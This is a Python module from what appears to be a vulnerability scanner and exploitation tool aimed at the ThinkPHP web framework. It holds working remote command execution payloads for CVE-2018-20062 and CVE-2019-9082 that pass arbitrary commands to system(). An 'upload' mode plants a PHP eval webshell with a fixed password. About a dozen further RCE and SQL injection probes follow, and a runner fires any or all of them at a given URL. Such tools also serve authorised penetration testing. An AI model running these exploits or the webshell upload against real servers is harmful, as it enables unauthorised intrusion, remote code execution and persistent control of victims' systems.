import requests,platform,time,datetime,re
from ClassCongregation import _urlparse
from requests_toolbelt.utils import dump
from operator import methodcaller
import CodeTest
################
##--ApacheSolr--##
#cve_2018_20062 命令执行
#cve_2019_9082  CMD = upload
################
#VULN = None => 漏洞测试
#VULN = True => 命令执行
VULN = ''
TIMEOUT = ''
class ThinkPHP():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
        self.payload_cve_2018_20062 = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=RECOMMAND"
        self.payload_cve_2019_9082 = ("/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&"
            "vars[0]=system&vars[1][]=RECOMMAND")
        self.payload_cve_2019_9082_webshell = ("/index.php/?s=/index/\\think\\app/invokefunction&function="
            "call_user_func_array&vars[0]=file_put_contents&vars[1][]=FILENAME&vars[1][]=<?php%20eval"
            "(@$_POST[%27SHELLPASS%27]);?>")
    
    def cve_2018_20062(self):
        self.pocname = "ThinkPHP: CVE-2018-20062"
        self.info = CodeTest.Colored_.rce()
        self.payload = self.payload_cve_2018_20062.replace("RECOMMAND", self.CMD)
        self.path = "/index.php?s=captcha"
        self.method = "post"
        self.rawdata = "null"
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
            'Connection': "close",
            'Content-Type': "application/x-www-form-urlencoded",
            'Accept': "*/*",
            'Cache-Control': "no-cache"
        }
        try:
            self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)           
      
    def cve_2019_9082(self):
        self.pocname = "ThinkPHP: CVE-2019-9082"
        self.info = CodeTest.Colored_.rce()
        self.payload = self.payload_cve_2019_9082.replace("RECOMMAND", self.CMD)
        self.method = "get"
        self.rawdata = "null"
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
            'Connection': "close",
            'Accept': "*/*",
            'Cache-Control': "no-cache"
        }
        try:
            self.request = requests.get(self.url + self.payload, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if self.CMD == "upload":
                if os_check() == "linux" or os_check() == "other":
                    self.filename = "vulmap.php"
                    self.shellpass = "123456"
                elif os_check() == "windows": 
                    self.filename = "vulmap.php"
                    self.shellpass = "123456"
                self.payload = self.payload_cve_2019_9082_webshell.replace("FILENAME", self.filename).replace("SHELLPASS", self.shellpass)
                self.request = requests.get(self.url + self.payload, headers=self.headers, timeout=TIMEOUT, verify=False)
                self.r = "WebShell: " + self.url + "/" + self.filename
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            
            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_checkcode_time_sqli_verify(self):
        self.pocname = "thinkPHP:thinkphp_checkcode_time_sqli_verify"
        self.method = "post"
        self.rawdata = "null"
        self.info = "[sql]"
        self.r = "PoCWating"

        self.path = "/index.php?s=/home/user/checkcode/"
        self.data = "----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(3)#\r\n\r\n----------641902708--"
        self.headers = {
                    "User-Agent" : "TPscan",
                    "DNT": "1",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Content-Type": "multipart/form-data; boundary=--------641902708",
                    "Accept-Encoding": "gzip, deflate, sdch",
                    "Accept-Language": "zh-CN,zh;q=0.8",}
        try:
            start_time = time.time()
            self.request = requests.post(self.url + self.path, data=self.data, headers=self.headers, timeout=5, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if time.time() - start_time >= 3:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_construct_code_exec_verify(self):
        self.pocname = "thinkPHP:thinkphp_construct_code_exec_verify"
        self.method = "post"
        self.rawdata = "null"
        self.info = "[rce]"
        self.r = "PoCWating"

        self.path = "/index.php?s=captcha"
        self.data = {
                '_method':'__construct',
                'filter[]':'var_dump',
                'method':'get',
                'server[REQUEST_METHOD]':'56540676a129760a3'}

        self.headers = {"User-Agent" : "hanhan"}
        try:
            self.request = requests.post(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if r"56540676a129760a3" in self.request.text:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_construct_debug_rce_verify(self):
        self.pocname = "thinkPHP:thinkphp_construct_debug_rce_verify"
        self.method = "post"
        self.rawdata = "null"
        self.info = "[rce]"
        self.r = "PoCWating"

        self.path = "/index.php"
        self.data = {
                '_method':'__construct',
                'filter[]':'var_dump',
                'server[REQUEST_METHOD]':'56540676a129760a3'}

        self.headers = {"User-Agent" : "hanhan"}
        try:
            self.request = requests.post(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if r"56540676a129760a3" in self.request.text:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_debug_index_ids_sqli_verify(self):
        self.pocname = "thinkPHP:thinkphp_debug_index_ids_sqli_verify"
        self.method = "get"
        self.rawdata = "null"
        self.info = "[sql]"
        self.r = "PoCWating"

        self.path = "/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(2333)),0)]=1"
        self.data = "null"

        self.headers = {"User-Agent" : "hanhan"}
        try:
            self.request = requests.get(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if r"56540676a129760" in self.request.text:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_driver_display_rce_verify(self):
        self.pocname = "thinkPHP:thinkphp_driver_display_rce_verify"
        self.method = "get"
        self.rawdata = "null"
        self.info = "[rce]"
        self.r = "PoCWating"

        self.path = "/index.php?s=index/\\think\\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E"
        self.data = "null"

        self.headers = {"User-Agent" : "hanhan"}
        try:
            self.request = requests.get(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if r"56540676a129760a" in self.request.text:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_index_construct_rce_verify(self):
        self.pocname = "thinkPHP:thinkphp_index_construct_rce_verify"
        self.method = "post"
        self.rawdata = "null"
        self.info = "[rce]"
        self.r = "PoCWating"

        self.path = "/index.php?s=index/index/index"
        self.data = "s=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump"

        self.headers = {
                "User-Agent": 'hanhan',
                "Content-Type": "application/x-www-form-urlencoded",}
        try:
            self.request = requests.post(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if r"4e5e5d7364f443e28fbf0d3ae744a59a" in self.request.text:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_index_showid_rce_verify(self):
        self.pocname = "thinkPHP:thinkphp_index_showid_rce_verify"
        self.method = "get"
        self.rawdata = "null"
        self.info = "[rce]"
        self.r = "PoCWating"

        self.path_temp = "/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]"
        self.path = "/index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{0}.log"
        self.data = "null"

        self.headers = {"User-Agent": 'hanhan'}
        try:
            self.request_temp = requests.get(self.url + self.path_temp, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            timenow = datetime.datetime.now().strftime("%Y_%m_%d")[2:]
            self.request = requests.get(self.url + self.path.format(timenow), data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if r"56540676a129760a3" in self.request.text:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_invoke_func_code_exec_verify(self):
        self.pocname = "thinkPHP:thinkphp_invoke_func_code_exec_verify"
        self.method = "get"
        self.rawdata = "null"
        self.info = "[rce]"
        self.r = "PoCWating"

        self.path = "/index.php?s={0}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333"
        self.data = "null"

        self.headers = {"User-Agent": 'hanhan'}
        try:
            controllers = list()
            self.request_temp = requests.get(self.url, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            pattern = '<a[\\s+]href="/[A-Za-z]+'
            matches = re.findall(pattern, self.request_temp.text)
            for match in matches:
                controllers.append(match.split('/')[1])
            controllers.append('index')
            controllers = list(set(controllers))
            for controller in controllers:
                try:
                    self.request = requests.get(self.url + self.path.format(controller), data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
                    self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                    if r"56540676a129760a3" in self.request.text:
                        self.r = "PoCSuCCeSS"
                        CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                        break
                except:
                    pass
            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_lite_code_exec_verify(self):
        self.pocname = "thinkPHP:thinkphp_lite_code_exec_verify"
        self.method = "get"
        self.rawdata = "null"
        self.info = "[rce]"
        self.r = "PoCWating"

        self.path = "/index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D"
        self.data = "null"

        self.headers = {"User-Agent": 'hanhan'}
        try:
            self.request = requests.get(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if r"56540676a129760a3" in self.request.text:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)


    def thinkphp_method_filter_code_exec_verify(self):
        self.pocname = "thinkPHP:thinkphp_method_filter_code_exec_verify"
        self.method = "post"
        self.rawdata = "null"
        self.info = "[rce]"
        self.r = "PoCWating"

        self.path = "/index.php"
        self.data = {
                'c':'var_dump',
                'f':'4e5e5d7364f443e28fbf0d3ae744a59a',
                '_method':'filter',}

        self.headers = {"User-Agent": 'hanhan'}
        try:
            self.request = requests.post(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if r"4e5e5d7364f443e28fbf0d3ae744a59a" in self.request.text:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_multi_sql_leak_verify(self):
        self.pocname = "thinkPHP:thinkphp_multi_sql_leak_verify"
        self.method = "get"
        self.rawdata = "null"
        self.info = "[sql]"
        self.r = "PoCWating"

        self.path = [
            r'/index.php?s=/home/shopcart/getPricetotal/tag/1%27',
            r'/index.php?s=/home/shopcart/getpriceNum/id/1%27',
            r'/index.php?s=/home/user/cut/id/1%27',
            r'/index.php?s=/home/service/index/id/1%27',
            r'/index.php?s=/home/pay/chongzhi/orderid/1%27',
            r'/index.php?s=/home/order/complete/id/1%27',
            r'/index.php?s=/home/order/detail/id/1%27',
            r'/index.php?s=/home/order/cancel/id/1%27',]
        self.data = "null"

        self.headers = {"User-Agent": 'hanhan'}
        try:
            for path in self.path:
                try:
                    self.request = requests.get(self.url + path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
                    self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                    if r"SQL syntax" in self.request.text:
                        self.r = "PoCSuCCeSS"
                        CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                        break
                except:
                    pass
            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_pay_orderid_sqli_verify(self):
        self.pocname = "thinkPHP:thinkphp_pay_orderid_sqli_verify"
        self.method = "get"
        self.rawdata = "null"
        self.info = "[sql]"
        self.r = "PoCWating"

        self.path = "/index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+"
        self.data = "null"

        self.headers = {"User-Agent": 'hanhan'}
        try:
            self.request = requests.get(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if r"56540676a129760a" in self.request.text:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_request_input_rce_verify(self):
        self.pocname = "thinkPHP:thinkphp_request_input_rce_verify"
        self.method = "get"
        self.rawdata = "null"
        self.info = "[rce]"
        self.r = "PoCWating"

        self.path = "/index.php?s=index/\\think\Request/input&filter=var_dump&data=f7e0b956540676a129760a3eae309294"
        self.data = "null"

        self.headers = {"User-Agent": 'hanhan'}
        try:
            self.request = requests.get(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if r"56540676a129760a" in self.request.text:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def thinkphp_view_recent_xff_sqli_verify(self):
        self.pocname = "thinkPHP:thinkphp_view_recent_xff_sqli_verify"
        self.method = "get"
        self.rawdata = "null"
        self.info = "[sql]"
        self.r = "PoCWating"

        self.path = "/index.php?s=/home/article/view_recent/name/1"
        self.data = "null"

        self.headers = {
                "User-Agent" : 'hanhan',
                "X-Forwarded-For" : "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"}
        try:
            self.request = requests.get(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if r"56540676a129760a" in self.request.text:
                self.r = "PoCSuCCeSS"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

def os_check():
    if platform.system().lower() == 'windows':
        return "windows"
    elif platform.system().lower() == 'linux':
        return "linux"
    else:
        return "other"

print("""eg: http://127.0.0.1/tp5/public/
+------------------------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type                        | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+------------------------------------+------------------+-----+-----+-------------------------------------------------------------+
| ThinkPHP                           | cve_2018_20062   |  Y  |  Y  | < 3.2.4, thinkphp rememberme deserialization rce            |
| ThinkPHP                           | cve_2019_9082    |  Y  |  Y  | <= 5.0.23, 5.1.31, thinkphp rememberme deserialization rce  |
| thinkphp_checkcode_time_sqli.py    |                  |  Y  |  Y  |                                                             |
| thinkphp_construct_code_exec.py    |                  |  Y  |  Y  |                                                             |
| thinkphp_construct_debug_rce.py    |                  |  Y  |  Y  |                                                             |
| thinkphp_debug_index_ids_sqli.py   |                  |  Y  |  Y  |                                                             |
| thinkphp_driver_display_rce.py     |                  |  Y  |  Y  |                                                             |
| thinkphp_index_construct_rce.py    |                  |  Y  |  Y  |                                                             |
| thinkphp_index_showid_rce.py       |                  |  Y  |  Y  |                                                             |
| thinkphp_invoke_func_code_exec.py  |                  |  Y  |  Y  |                                                             |
| thinkphp_lite_code_exec.py         |                  |  Y  |  Y  |                                                             |
| thinkphp_method_filter_code_exec.py|                  |  Y  |  Y  |                                                             |
| thinkphp_multi_sql_leak.py         |                  |  Y  |  Y  |                                                             |
| thinkphp_pay_orderid_sqli.py       |                  |  Y  |  Y  |                                                             |
| thinkphp_request_input_rce.py      |                  |  Y  |  Y  |                                                             |
| thinkphp_view_recent_xff_sqli.py   |                  |  Y  |  Y  |                                                             |
+------------------------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    global VULN,TIMEOUT
    VULN = kwargs['vuln']
    TIMEOUT = int(kwargs['timeout'])
    CodeTest.Verification.CMD = kwargs['cmd']
    CodeTest.Verification.VULN = kwargs['vuln']
    if VULN == 'False':
        ExpThinkPHP = ThinkPHP(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
        #ExpThinkPHP = ThinkPHP(kwargs['url'],"echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpThinkPHP = ThinkPHP(_urlparse(kwargs['url']),kwargs['cmd'])
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpThinkPHP, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
    else:#调用所有函数
        for func in dir(ThinkPHP):
            if not func.startswith("__"):
                methodcaller(func)(ExpThinkPHP)








